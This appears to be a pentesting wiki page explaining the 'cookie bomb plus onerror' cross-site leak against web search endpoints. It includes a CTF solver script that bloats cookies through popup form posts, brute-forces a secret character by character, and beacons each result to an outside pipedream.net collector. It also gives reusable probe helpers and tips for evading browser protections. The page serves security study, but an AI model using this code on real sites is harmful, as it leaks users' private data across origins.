_body: "# Cookie Bomb + Onerror XS Leak\n\n{{#include ../../banners/hacktricks-training.md}}\n\nThis technique combines:\n\
  - Cookie bombing: stuffing the victim’s browser with many/large cookies for the target origin so that subsequent requests\
  \ hit server/request limits (request header size, URL size in redirects, etc.).\n- Error-event oracle: probing a cross-origin\
  \ endpoint with a `<script>` (or other subresource) and distinguishing states with `onload` vs `onerror`.\n\nHigh level\
  \ idea\n- Find a target endpoint whose behavior differs for two states you want to test (e.g., search “hit” vs “miss”).\n\
  - Ensure the “hit” path will trigger a heavy redirect chain or long URL while the “miss” path stays short. Inflate request\
  \ headers using many cookies so that only the “hit” path causes the server to fail with an HTTP error (e.g., 431/414/400).\
  \ The error flips the onerror event and becomes an oracle for XS-Search.\n\nWhen does this work\n- You can cause the victim\
  \ browser to send cookies to the target (e.g., cookies are SameSite=None or you can set them in a first-party context via\
  \ a popup `window.open`).\n- There is an app feature you can abuse to set arbitrary cookies (e.g., “save preference” endpoints\
  \ that turn controlled input names/values into Set-Cookie) or to make post-auth redirects that incorporate attacker-controlled\
  \ data into the URL.\n- The server reacts differently on the two states and, with inflated headers/URL, one state crosses\
  \ a limit and returns an error response that triggers onerror.\n\nNote on server errors used as the oracle\n- 431 Request\
  \ Header Fields Too Large is commonly returned when cookies inflate request headers; 414 URI Too Long or a server-specific\
  \ 400 may be returned for long request targets. Any of these result in a failed subresource load and fire onerror. See [MDN’s\
  \ 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) for typical causes like excessive cookies.\n\n\
  <details>\n<summary>Practical example (angstromCTF 2022)</summary>\n\nThe following script (from a public writeup) abuses\
  \ a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When\
  \ the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns\
  \ an error status, so script.onerror fires; otherwise nothing happens.\n\n```html\n<>'\";\n<form action=\"https://sustenance.web.actf.co/s\"\
  \ method=\"POST\">\n  <input id=\"f\" /><input name=\"search\" value=\"a\" />\n</form>\n<script>\n  const $ = document.querySelector.bind(document)\n\
  \  const sleep = (ms) => new Promise((r) => setTimeout(r, ms))\n  let i = 0\n  const stuff = async (len = 3500) => {\n \
  \   let name = Math.random()\n    $(\"form\").target = name\n    let w = window.open(\"\", name)\n    $(\"#f\").value =\
  \ \"_\".repeat(len)\n    $(\"#f\").name = i++\n    $(\"form\").submit()\n    await sleep(100)\n  }\n  const isError = async\
  \ (url) => {\n    return new Promise((r) => {\n      let script = document.createElement(\"script\")\n      script.src =\
  \ url\n      script.onload = () => r(false)\n      script.onerror = () => r(true)\n      document.head.appendChild(script)\n\
  \    })\n  }\n  const search = (query) => {\n    return isError(\n      \"https://sustenance.web.actf.co/q?q=\" + encodeURIComponent(query)\n\
  \    )\n  }\n  const alphabet =\n    \"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ\"\n  const url\
  \ = \"//en4u1nbmyeahu.x.pipedream.net/\"\n  let known = \"actf{\"\n  window.onload = async () => {\n    navigator.sendBeacon(url\
  \ + \"?load\")\n    await Promise.all([stuff(), stuff(), stuff(), stuff()])\n    await stuff(1600)\n    navigator.sendBeacon(url\
  \ + \"?go\")\n    while (true) {\n      for (let c of alphabet) {\n        let query = known + c\n        if (await search(query))\
  \ {\n          navigator.sendBeacon(url, query)\n          known += c\n          break\n        }\n      }\n    }\n  }\n\
  </script>\n```\n\n</details>\n\nWhy the popup (`window.open`)?\n- Modern browsers increasingly block third-party cookies.\
  \ Opening a top-level window to the target makes cookies first‑party so Set-Cookie responses from the target will stick,\
  \ enabling the cookie-bomb step even with third‑party cookie restrictions.\n\n2024–2025 notes on cookie availability\n-\
  \ Chrome’s Tracking Protection rollout (January 2024) is already blocking third-party cookies for a random cohort and is\
  \ slated to expand to the entire user base once the UK CMA signs off, so assume any victim can abruptly lose 3P cookies.\
  \ Automate the fallback: detect when your script probe fails without ever hitting the target and transparently pivot to\
  \ the popup/first-party flow. Safari and Firefox already block most third-party cookies by default and CHIPS/partitioned\
  \ cookies mean each top-level site now has its own jar.\n- Use a first‑party cookie planting flow (`window.open` + auto-submit\
  \ to a cookie-setting endpoint) and then probe with a subresource that only succeeds when those cookies are sent. If third‑party\
  \ cookies are blocked, move the probe into a same-site context (e.g., run the oracle in the popup via a same-site gadget\
  \ and exfiltrate the boolean with `postMessage` or a beacon to your server), or enroll the victim origin in Chrome’s deprecation\
  \ trial if you legitimately control it.\n\n<details>\n<summary>Tracking-Protection-safe first-party planting helper</summary>\n\
  \nWhen you need to stuff dozens of cookies from a cross-site context, stage a temporary top-level window and fire a series\
  \ of oversized form submissions into the vulnerable Set-Cookie endpoint:\n```js\nasync function plantFirstPartyCookies(endpoint,\
  \ fields) {\n  for (let i = 0; i < 5; i++) {\n    const name = crypto.randomUUID();\n    const form = Object.assign(document.createElement('form'),\
  \ {action:endpoint, method:'POST', target:name});\n    Object.entries(fields).forEach(([k, v]) => {\n      const input =\
  \ document.createElement('input');\n      input.name = k;\n      input.value = v + '_'.repeat(400 + 120 * i);\n      form.appendChild(input);\n\
  \    });\n    document.body.appendChild(form);\n    window.open('about:blank', name, 'noopener');\n    form.submit();\n\
  \    await new Promise(r => setTimeout(r, 120));\n    form.remove();\n  }\n}\n```\nCall it right before you begin probing\
  \ so every oracle run starts with a freshly inflated cookie jar.\n\n</details>\n\nGeneric probing helper\nIf you already\
  \ have a way to set many cookies on the target origin (first-party), you can reuse this minimal oracle against any endpoint\
  \ whose success/failure leads to different network outcomes (status/MIME/redirect):\n\n```js\nfunction probeError(url) {\n\
  \  return new Promise((resolve) => {\n    const s = document.createElement('script');\n    s.src = url;\n    s.onload =\
  \ () => resolve(false);  // loaded successfully\n    s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME,\
  \ blocked)\n    document.head.appendChild(s);\n  });\n}\n```\n\nAlternative tag oracle (stylesheet)\n```js\nfunction probeCSS(url)\
  \ {\n  return new Promise((resolve) => {\n    const l = document.createElement('link');\n    l.rel = 'stylesheet';\n   \
  \ l.href = url;\n    l.onload = () => resolve(false);\n    l.onerror = () => resolve(true);\n    document.head.appendChild(l);\n\
  \  });\n}\n```\n\nAdvanced: de Bruijn–based cookie packing (CTF-proven)\n- When the app lets you control large cookie values,\
  \ you can pack guesses efficiently by appending a de Bruijn sequence to each probe. This keeps per‑probe overhead small\
  \ while ensuring the heavy branch is consistently heavier only for the right prefix. Example generator for |Σ| symbols of\
  \ length n (fits in a cookie value):\n```js\nconst ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';\n\
  function deBruijn(k, n, alphabet=ALPH){\n  const a = Array(k * n).fill(0), seq=[];\n  (function db(t,p){\n    if(t>n){ if(n%p===0)\
  \ for(let j=1;j<=p;j++) seq.push(a[j]); }\n    else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);}\
  \ }\n  })(1,1);\n  return seq.map(i=>alphabet[i]).join('');\n}\n```\n- Idea in practice: set multiple cookies whose values\
  \ are prefix + deBruijn(k,n). Only when the tested prefix is correct does the server take the heavy path (e.g., extra redirect\
  \ reflecting the long cookie or URL), which, combined with the cookie bloat, crosses limits and flips onerror. See a LA\
  \ CTF 2024 public solver using this approach.\n\nTips to build the oracle\n- Force the “positive” state to be heavier: chain\
  \ an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with\
  \ the guessed prefix.\n- Inflate headers: repeat cookie bombing until a consistent error is observed on the “heavy” path.\
  \ Servers commonly cap header size and will fail sooner when many cookies are present.\n- Stabilize: fire multiple parallel\
  \ cookie set operations and probe repeatedly to average out timing and caching noise.\n- Bust caches and avoid pooling artifacts:\
  \ add a random `#fragment` or `?r=` to probe URLs, and prefer distinct window names when using `window.open` loops.\n- Alternate\
  \ subresources: if `<script>` is filtered, try `<link rel=stylesheet>` or `<img>`. The onload/onerror boolean is the oracle;\
  \ content never needs to be parsed.\n\nCommon header/URL limits (useful thresholds)\n- Reverse proxies/CDNs and servers\
  \ enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the\
  \ edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize)\
  \ are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly (see [Cloudflare’s\
  \ documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).\n\nBrowser hardening\
  \ watchlist (2025+)\n- Firefox 139/ESR 128.11 (May 2025) tightened script tag load/error accounting for cross-origin resources\
  \ (CVE-2025-5266). On patched clients the `onerror` signal for certain redirected responses is suppressed, so diversify\
  \ the oracle (parallel `<link rel=stylesheet>`, `<img>`, or `fetch` with mismatched MIME) and fingerprint the victim UA\
  \ before assuming the boolean still fires.\n- Expect enterprise Chromium builds with Tracking Protection or Fetch Metadata\
  \ policies to intermittently strip cookies or rewrite redirects. Detect these cases by probing a short endpoint first; when\
  \ it fails, automatically pivot to running the entire attack inside the popup and relaying bits through `postMessage`/`BroadcastChannel`.\n\
  \nRelated XS-Search tricks\n- URL length based oracles (no cookies needed) can be combined or used instead when you can\
  \ force a very long request target:\n\n{{#ref}}\nurl-max-length-client-side.md\n{{#endref}}\n\nNotes\n- This class of attacks\
  \ is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch\
  \ over server limits, producing a reliable boolean oracle.\n\n\n\n## References\n- XS-Leaks: Error Events (onerror/onload\
